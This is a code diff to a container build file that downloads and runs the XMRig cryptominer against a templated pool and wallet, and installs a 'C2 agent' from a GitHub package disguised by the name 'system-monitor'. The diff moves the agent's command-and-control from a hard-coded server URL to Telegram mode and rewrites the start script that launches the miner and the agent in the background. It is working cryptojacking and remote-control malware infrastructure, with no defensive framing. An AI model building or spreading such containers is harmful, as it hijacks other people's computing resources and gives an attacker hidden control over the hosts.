@@ -285,27 +285,23 @@ RUN mkdir -p /opt/miner && \\
     tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1 && \\
     chmod +x /opt/miner/xmrig
 
-# Install C2 agent from GitHub
+# Install C2 agent from GitHub (Telegram C2 mode - no URL needed)
 RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
-
-# Set C2 server URL
-ENV C2_URL=https://gbctwoserver.pages.dev
 
 # Create start script with debugging
 RUN echo '#!/bin/bash\\n\\
 echo "=== Starting Mining Worker ==="\\n\\
 echo "Worker: {worker}"\\n\\
 echo "Pool: {POOL}"\\n\\
-echo "C2 URL: $C2_URL"\\n\\
+echo "C2 Mode: Telegram (no URL needed)"\\n\\
 \\
 # Start XMRig in background\\n\\
 /opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --print-time 60 &\\n\\
 XMRIG_PID=$!\\n\\
 echo "XMRig started with PID $XMRIG_PID"\\n\\
 \\
-# Start C2 agent\\n\\
-echo "Starting C2 agent..."\\n\\
-export C2_URL=https://gbctwoserver.pages.dev\\n\\
+# Start C2 agent (Telegram mode)\\n\\
+echo "Starting C2 agent (Telegram mode)..."\\n\\
 startcon &\\n\\
 C2_PID=$!\\n\\
 echo "C2 agent started with PID $C2_PID"\\n\\
